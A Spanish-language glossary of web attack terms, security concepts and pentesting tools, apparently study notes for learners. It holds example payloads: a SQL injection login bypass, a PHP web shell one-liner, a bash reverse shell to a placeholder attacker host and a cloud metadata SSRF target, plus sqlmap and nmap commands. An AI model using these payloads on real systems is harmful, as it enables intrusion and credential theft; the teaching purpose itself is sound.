# **Terminos de Ataque**

## XSS
Cross-Site Scripting: inyección de scripts en páginas web vistas por otros usuarios.
El atacante inyecta JavaScript malicioso que se ejecuta en el navegador de la víctima. Puede robar cookies, redirigir a sitios falsos o capturar formularios. Existen tres tipos: Reflejado, Avanzado, DOM-Based

## SQL Injection: 
Inserción de código SQL malicioso en campos de entrada.
Ocurre cuando la app no valida el input del usuario. El atacante manipula consultas SQL para acceder, modificar o eliminar datos. Ejemplo: ingresar ' OR '1'='1 en un login para saltarse la autenticación.

## CSRF
Cross-Site Request Forgery: fuerza al navegador de la víctima a hacer peticiones no autorizadas.
El atacante engaña al usuario autenticado para que ejecute acciones sin saberlo. Por ejemplo, hacer una transferencia bancaria con solo visitar una página maliciosa. Se previene con tokens CSRF únicos por sesión.

## LFI
Local File Inclusion: inclusión de archivos locales del servidor en la respuesta.
Permite leer archivos internos del servidor como /etc/passwd. Ocurre cuando la app incluye archivos sin validar el path. A veces puede escalar a ejecución de código (RCE) combinado con log poisoning.

## RFI
Remote File Inclusion: carga de archivos remotos maliciosos en el servidor.
Similar a LFI pero el archivo viene de un servidor externo controlado por el atacante. Permite ejecutar código arbitrario directamente. Requiere que allow_url_include esté activo en PHP.

## RCE
Remote Code Execution: ejecución de código arbitrario en el servidor.
El objetivo más crítico. Permite al atacante ejecutar cualquier comando en el sistema operativo del servidor. Puede lograrse vía LFI, web shells, deserialización insegura, o vulnerabilidades en el software del servidor.

## SSRF
Server-Side Request Forgery: el servidor hace peticiones a destinos controlados por el atacante.
El atacante hace que el servidor haga peticiones HTTP a recursos internos (como http://169.254.169.254 en AWS para obtener credenciales). Muy peligroso en entornos cloud.

## XXE
XML External Entity: explotación del parser XML para acceder a recursos internos.
Se abusa de la funcionalidad de entidades externas en XML. Puede usarse para leer archivos del sistema, hacer SSRF, o incluso DoS. Común en APIs SOAP y aplicaciones que aceptan XML.

## IDOR
Insecure Direct Object Reference: acceso a objetos sin verificar autorización.
El atacante modifica un ID en la URL o petición para acceder a datos de otros usuarios. Ejemplo: cambiar /perfil?id=123 a /perfil?id=124 y ver datos ajenos. Es un fallo de control de acceso.

## Path Traversal
Navegación fuera del directorio permitido usando secuencias como ../
El atacante usa secuencias ../../ para navegar fuera del directorio raíz de la app y acceder a archivos del sistema como /etc/passwd o claves privadas SSH.

## Clickjacking
Engaño visual para que el usuario haga clic en elementos ocultos.
Se superpone un iframe invisible sobre un botón legítimo. El usuario cree hacer clic en algo normal pero en realidad ejecuta una acción en otro sitio. Se previene con el header X-Frame-Options.

## Brute Force
Prueba sistemática de combinaciones hasta dar con la correcta.
Se prueban miles de contraseñas o credenciales de forma automatizada. Herramientas comunes: Hydra, Burp Intruder. Se mitiga con rate limiting, CAPTCHA, y bloqueo de IP tras intentos fallidos.

## Web Shell
Script malicioso subido al servidor para control remoto.
Permite al atacante ejecutar comandos del sistema operativo desde el navegador. Ejemplo en PHP: <?php system($_GET['cmd']); ?>. Generalmente es el resultado de una vulnerabilidad de subida de archivos.

# **Terminos Conceptuales**

## SGBD
Sistema Gestor de Base de Datos: motor que administra los datos.
Ejemplos: MySQL, PostgreSQL, SQL Server, Oracle, SQLite. Cada uno tiene su propio dialecto SQL, funciones y comentarios. Identificar el SGBD es clave en ataques de inyección para usar el payload correcto.

## Payload
Dato malicioso enviado al objetivo para explotar una vulnerabilidad
Es la parte del ataque que hace el daño. En SQLi, sería la cadena con comillas y comandos SQL. En XSS, sería el tag <script>. Los payloads se adaptan según el contexto y la tecnología objetivo.

## Footprinting
Recolección pasiva de información sobre el objetivo antes de atacar.
Primera fase de un pentest. Incluye búsqueda en WHOIS, DNS, Google Dorks, Shodan, redes sociales. No se interactúa directamente con el objetivo para no dejar rastro ni activar alertas.

## Fingerprinting
Identificación del software, versiones y tecnologías del objetivo.
Se detecta el servidor web (Apache, Nginx), lenguaje (PHP, ASP), CMS (WordPress), SGBD, etc. Puede hacerse analizando headers HTTP, errores, extensiones de archivos, o herramientas como WhatWeb.

## Pentest
Prueba de penetración: ataque ético y controlado para encontrar vulnerabilidades.
Proceso autorizado de simular ataques reales para identificar debilidades. Se divide en fases: reconocimiento, escaneo, explotación, post-explotación y reporte. Diferente a hacking malicioso por el permiso explícito.

## CVE
Common Vulnerabilities and Exposures: registro público de vulnerabilidades conocidas.
Base de datos global de vulnerabilidades con identificador único (ej: CVE-2021-44228 es Log4Shell). Permite a empresas y herramientas referenciar vulnerabilidades de forma estandarizada.

## Zero-Day
Vulnerabilidad desconocida para el fabricante, sin parche disponible.
El término viene de que el fabricante tiene 'cero días' para reaccionar. Son extremadamente valiosas porque no hay defensa directa. Se usan en ataques dirigidos o se venden en mercados especializados.

## Reverse Shell
Conexión iniciada desde el servidor comprometido hacia el atacante.
A diferencia de una shell normal, aquí es el servidor víctima quien se conecta al atacante. Útil para evadir firewalls que bloquean conexiones entrantes. Ejemplo: bash -i >& /dev/tcp/attacker-ip/4444 0>&1.

## Cookie de sesión
Token que identifica a un usuario autenticado en el servidor.
Tras el login, el servidor entrega una cookie con un ID de sesión. Si el atacante la roba (vía XSS o MITM), puede suplantar al usuario sin necesidad de contraseña. Deben ser HttpOnly, Secure y con SameSite.

# **Herramientas**

## Burp Suite
Plataforma de pruebas de seguridad web con proxy interceptor.
Permite interceptar, modificar y repetir peticiones HTTP. Sus módulos principales son: Proxy, Repeater, Intruder (fuerza bruta), Scanner y Decoder. Es la herramienta más usada en pentesting web.

## SQLmap
Herramienta automática para detectar y explotar inyecciones SQL.
Automatiza la detección y explotación de SQLi. Puede extraer bases de datos completas, credenciales y archivos del servidor. Uso básico: sqlmap -u 'http://site.com/page?id=1' --dbs.

## Nmap
Escáner de red para descubrir hosts y servicios abiertos.
Detecta puertos abiertos, versiones de servicios y sistema operativo. Comando básico: nmap -sV -sC target.com. También puede ejecutar scripts NSE para detectar vulnerabilidades conocidas.

## Metasploit
Framework de explotación con módulos para cientos de vulnerabilidades.
Permite buscar, configurar y lanzar exploits contra sistemas vulnerables. Incluye payloads para obtener shells remotas (Meterpreter). Muy usado en entornos de laboratorio y CTFs.

## Gobuster / Dirb
Fuerza bruta de directorios y archivos ocultos en servidores web.
Prueban listas de palabras contra el servidor para encontrar rutas ocultas como /admin, /backup.zip, /.env. Esencial en la fase de reconocimiento activo.
